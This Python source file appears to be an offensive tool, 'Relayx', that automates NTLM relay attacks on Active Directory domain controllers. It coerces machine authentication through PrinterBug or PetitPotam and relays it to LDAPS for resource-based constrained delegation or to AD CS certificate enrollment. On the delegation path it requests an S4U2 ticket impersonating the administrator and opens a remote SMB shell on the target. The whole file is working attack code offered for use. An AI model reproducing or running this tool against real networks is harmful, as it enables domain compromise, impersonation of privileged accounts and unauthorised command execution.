#!/usr/bin/env python
# -*- coding: UTF-8 -*-
import ssl
import argparse
import logging
import sys
import time
import os
import config
import requests
from sys import version_info
from multiprocessing import Manager
from threading import Thread, Lock 
from impacket.examples import logger
from impacket.examples import utils
from impacket import version
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
from comm import logger
from comm.ntlmrelayx.attacks import PROTOCOL_ATTACKS
from comm.ntlmrelayx.utils.config import NTLMRelayxConfig # add AD CS
from comm.ntlmrelayx.servers import SMBRelayServer
from comm.trigger.printer import PrinterBug
from comm.trigger.efs import CoerceAuth
from comm.ticket.getST import GETST
from comm.execute.smbexec import CMDEXEC


def banner():
	banner = R"""                              
  ██▀███  ▓█████  ██▓    ▄▄▄     ▓██   ██▓▒██   ██▒
 ▓██ ▒ ██▒▓█   ▀ ▓██▒   ▒████▄    ▒██  ██▒▒▒ █ █ ▒░
 ▓██ ░▄█ ▒▒███   ▒██░   ▒██  ▀█▄   ▒██ ██░░░  █   ░
 ▒██▀▀█▄  ▒▓█  ▄ ▒██░   ░██▄▄▄▄██  ░ ▐██▓░ ░ █ █ ▒ 
 ░██▓ ▒██▒░▒████▒░██████▒▓█   ▓██▒ ░ ██▒▓░▒██▒ ▒██▒
 ░ ▒▓ ░▒▓░░░ ▒░ ░░ ▒░▓  ░▒▒   ▓▒█░  ██▒▒▒ ▒▒ ░ ░▓ ░
   ░▒ ░ ▒░ ░ ░  ░░ ░ ▒  ░ ▒   ▒▒ ░▓██ ░▒░ ░░   ░▒ ░
   ░░   ░    ░     ░ ░    ░   ▒   ▒ ▒ ░░   ░    ░  
    ░        ░  ░    ░  ░     ░  ░░ ░      ░    ░  
                                  ░ ░  version: 1.0                                                                                       
"""
	print(banner)
	print("\n\033[1;33m\t\tNtlmrelay attack \033[0m")
	print("\tAuthor: evi1cg (zuotonghk@gmail.com)\n")



def startServers(userDomain, userName, password, address, kdc, callback, options):
    global start
    start = time.time()
    logging.info("Current attack method is ==> {}".format(options.method.upper()))
    logging.info("Current trigger is  ==> {}".format(options.trigger.upper()))
    target_dc = kdc
    PoppedDB		= Manager().dict()	# A dict of PoppedUsers
    PoppedDB_Lock	= Lock()			# A lock for opening the dict
    c = NTLMRelayxConfig()
    c.setProtocolClients(PROTOCOL_CLIENTS)
    if options.method == "rbcd":
        c.setTargets(TargetsProcessor(singleTarget=str("ldaps://"+target_dc), protocolClients=PROTOCOL_CLIENTS))
        c.addcomputer = options.add_computer
        c.dumplaps = False
        c.dumpgmsa = False
        c.sid = None
        c.delegateaccess = True
        c.escalateuser = userName
    else:
        if options.ssl:
            target = "https://"+target_dc+"/certsrv/certfnsh.asp"
        else:
            target = "http://"+target_dc+"/certsrv/certfnsh.asp"
        c.setTargets(TargetsProcessor(singleTarget=str(target), protocolClients=PROTOCOL_CLIENTS))
        c.setIsADCSAttack(kdc)
        c.setADCSOptions(options.template)
    c.setOutputFile(None)
    c.setEncoding('ascii')
    c.setMode('RELAY')
    c.setAttacks(PROTOCOL_ATTACKS)
    c.setLootdir('.')
    c.setInterfaceIp("0.0.0.0")
    c.setExploitOptions(True,False)
    c.setSMB2Support(True)
    c.PoppedDB 		= PoppedDB 		# pass the poppedDB to the relay servers
    c.PoppedDB_Lock = PoppedDB_Lock # pass the poppedDB to the relay servers
    s = SMBRelayServer(c)
    s.start()
    logging.info("Relay servers started, waiting for connection....")
    try:
        status = exploit(userDomain, userName, password, address, kdc, callback, options)
        if status:
            exp = Thread(target=checkauth, args=(userDomain, userName, password, address, kdc, callback, options,))
            exp.daemon = True
            exp.start()
            try:
                if version_info.major == 2:
                    PY2 = True
                else:
                    PY2 = False
                while exp.isAlive() if PY2 else exp.is_alive():
                    pass
            except KeyboardInterrupt as e:
                logging.info("Shutting down...")
                s.server.shutdown()
        else:
            logging.error("Error in exploit, Shutting down...")
            s.server.shutdown()
    except Exception as e:
        logging.error("Error in exploit, Shutting down...")
        logging.info("Shutting down...")
        s.server.shutdown()


def checkauth(userDomain, userName, password, address, kdc, callback, options):
    getpriv = config.get_priv()
    dcync = config.get_dcsync()
    pki = config.get_pki()
    logging.info("Checking privs...")
    while True:
        if getpriv == True:
            if dcync:
                break
            elif options.method == "rbcd":
                s4u2pwnage(userDomain, userName, password, address, kdc, callback, options)
                break
        if pki == True:
            break
        getpriv = config.get_priv()
        dcync = config.get_dcsync()
        pki = config.get_pki()
        tmp = time.time() - start
        if tmp > options.timeout:
            logging.error("Time Out. exiting...")
            break


def s4u2pwnage(userDomain, userName, password, address, kdc, callback, options):
    logging.info("Executing s4u2pwnage..")
    new_username = config.get_newUser()
    new_password = config.get_newPassword()
    domain = userDomain
    targetName = config.get_targetName()
    if logging.getLogger().level == logging.DEBUG:
        options.debug = True
    options.targetName = targetName
    options.force_forwardable = True
    options.aesKey = None
    options.hashes = None
    thostname = '{}.{}'.format(targetName.replace("$", ""), domain)
    options.spn = 'cifs/{}'.format(thostname)
    try:
        executer = GETST(new_username, new_password, domain, options)
        executer.run()
        ccachefile = config.get_ccache()
        if os.path.exists(ccachefile):
            logging.info('Loading ticket..')
            os.environ['KRB5CCNAME'] = ccachefile
        else:
            logger.info("No ticket find. exit..")
            sys.exit(1)
        try:
            
            options.nooutput = False
            options.mode = "SHARE"
            options.service_name = "Google"
            logging.info('Trying to open a shell.')
            executer = CMDEXEC(options.impersonate, "", domain, options.hashes, options.aesKey, True, kdc,
                           options.mode, options.share, int(options.smb_port), options.service_name, options.shell_type, options.codec)
            executer.run(thostname, options.target_ip)
            #os.remove(ccachefile)
            logging.critical("Exit...")
        except KeyboardInterrupt as e:
            logging.error(str(e))
        except Exception as e:
            logging.error(str(e))
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            sys.exit(1)
    except Exception as e:
        logging.error(str(e))
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()

def exploit(userDomain, userName, password, address, kdc, callback, options):
    try:
        if options.trigger == "printer":
            lookup = PrinterBug(userName, password, userDomain, int(options.smb_port), options.hashes, callback)
            check = lookup.dump(address)
            if check:
                return True
        else:
            plop = CoerceAuth()
            if ":" in password:
                lmhash, nthash = password.split(':')
            else:
                lmhash = ''
                nthash = ''
            dce = plop.connect(username=userName, password=password, domain=userDomain, lmhash=lmhash, nthash=nthash, target=address, pipe=options.pipe)
            status = plop.EfsRpcOpenFileRaw(dce, callback)
            if status:
                return True
            dce.disconnect()
            if status:
                return True
        return False
    except KeyboardInterrupt:
        return False
    except Exception as e:
        return False

def check_adcs(url,options):
    if options.ssl:
        target_url = "https://{}/certsrv/certfnsh.asp".format(url)
    else:
        target_url = "http://{}/certsrv/certfnsh.asp".format(url)
    try:
        resp = requests.get(target_url, verify=False, timeout=options.timeout)
        if resp.status_code == 401:
            return True
    except Exception as e:
        logging.error("AD CS not found! Pls change DC ip to PDC.")
    return False
    


def main():
    parser = argparse.ArgumentParser(add_help=True,description='DCpwn with ntlmrelay')
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address> or LOCAL'
                                                       ' (if you want to parse local files)')

    parser.add_argument("-r","--callback-ip", required=True, help="Attacker callback IP")
    parser.add_argument("--timeout", default='30',type=int, help='timeout in seconds')
    parser.add_argument("--debug", action='store_true',help='Enable debug output')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action='store', metavar='LMHASH:NTHASH', help='Hash for account auth (instead of password)')

    
    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store', metavar='ip address', help='IP address of the Domain Controller')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')
    parser.add_argument('--smb-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                  help='Destination port to connect to SMB Server')
    

    group = parser.add_argument_group('attack')
    group.add_argument('-m',"--method" , action="store", choices=['rbcd','pki'], default="rbcd",help='Set up attack method, rbcd or pki')
    group.add_argument('-t',"--trigger" ,action="store", choices=['printer','efs'], default="printer", help='Set up trigger method, printer or petitpotam')
    group.add_argument('--impersonate', action="store",  default='administrator', help='target username that will be impersonated (thru S4U2Self)'
                                                              ' for quering the ST. Keep in mind this will only work if '
                                                              'the identity provided in this scripts is allowed for '
                                                              'delegation to the SPN specified')
    group.add_argument('--add-computer', action='store', metavar='COMPUTERNAME', required=False, const='Rand', nargs='?', help='Attempt to add a new computer account')
    group.add_argument('-pipe', action="store", choices=['efsr', 'lsarpc', 'samr', 'netlogon', 'lsass'], default='lsarpc', help='Named pipe to use (default: lsarpc)')
    group.add_argument('--template', action='store', metavar="TEMPLATE", required=False, default="Machine", help='AD CS template. If you are attacking Domain Controller or other windows server machine, default value should be suitable.')
    group.add_argument('-ssl', action='store_true', help='This is useful when AD CS use ssl.')


    group = parser.add_argument_group('execute')
    group.add_argument('-share', action='store', default='ADMIN$', help='share where the output will be grabbed from (default ADMIN$)')
    group.add_argument('-shell-type', action='store', default = 'cmd', choices = ['cmd', 'powershell'], help='choose '
                        'a command processor for the semi-interactive shell')
    group.add_argument('-codec', action='store', default='GBK', help='Sets encoding used (codec) from the target\'s output (default "GBK").')
    

    

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()
    
    logger.init(options.ts)
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)


    userDomain, userName, password, address = utils.parse_target(options.target)

    if userDomain == '':
        logging.critical('userDomain should be specified!')
        sys.exit(1)

    if options.target_ip is None:
        options.target_ip = address

    if options.dc_ip:
        kdc = options.dc_ip
    else:
        logging.info("If your target is not DC, pls set up dc-ip.")
        kdc = address

    if password == '' and userName != '' and options.hashes is None:
        from getpass import getpass
        password = getpass("Password:")
       
    if options.hashes:
        password = ("aad3b435b51404eeaad3b435b51404ee:" + options.hashes.split(":")[1]).upper()
    
    callback = options.callback_ip
    if options.method == "pki":
        ads = check_adcs(kdc,options)
        if not ads:
            sys.exit(0)
    startServers(userDomain, userName, password, address, kdc, callback, options)

if __name__ == '__main__':
    banner()
    main()
